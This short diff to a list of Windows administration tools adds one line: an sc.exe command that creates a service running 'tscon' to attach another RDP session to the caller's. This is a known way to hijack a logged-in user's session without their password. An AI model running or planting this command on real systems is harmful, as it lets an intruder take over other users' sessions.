@@ -1,4 +1,6 @@
 netsh, reg, netdom, winrm, winrs, repadmin, netdiag, dcdiag,
+sc.exe --% create hj binpath= "cmd.exe /k tscon 8 /dest:rdp-tcp#57"
+
 DNSCmd, DCPromo, route, netstat, nslookup, nblookup, portqry,
 nltest, dsadd, dsmod, dsget, dsquery, dsrm
 netdiag, dcdiag, dsacls, dsrevoke
